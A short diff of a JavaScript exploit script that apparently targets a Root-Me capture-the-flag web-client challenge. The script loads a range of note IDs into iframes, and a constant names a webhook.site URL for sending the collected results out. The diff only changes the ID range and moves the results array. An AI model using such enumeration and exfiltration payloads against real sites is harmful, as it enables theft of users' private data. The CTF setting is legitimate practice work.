@@ -1,10 +1,9 @@
 <script>
 const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
 const WEBHOOK = "https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864";
+let results = [];
 
-function run(a = 2800, b = 2840) {
-    let results = [];
-
+function run(a = 1000, b = 1100) {
     for (let i = a; i < b; i++) {
         const iframe = document.createElement("iframe");
         iframe.src = TARGET + i;
